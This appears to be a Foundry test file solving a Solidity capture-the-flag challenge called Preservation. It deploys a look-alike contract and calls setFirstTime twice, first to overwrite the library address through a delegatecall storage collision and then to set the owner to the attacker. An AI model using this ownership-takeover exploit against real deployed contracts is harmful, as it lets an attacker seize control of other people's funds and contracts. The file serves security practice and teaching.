// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import {Test, console} from "../lib/forge-std/src/Test.sol";

import {Preservation} from "../src/Preservation.sol";

contract PreservationTest is Test {
    Preservation target;
    PreservationHacker targetHacker;

    function setUp() public {
        target = new Preservation(address(0), address(0));
        targetHacker = new PreservationHacker();
    }

    function test_Preservation() public {
        address user = makeAddr("user");
        assert(target.owner() == address(0));
        vm.startPrank(user);
        target.setFirstTime(uint256(uint160(address(targetHacker))));
        target.setFirstTime(1);
        assert(target.owner() == user);
    }
}

contract PreservationHacker {
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner;

    function setTime(uint256 _time) public {
        owner = msg.sender;
    }
}
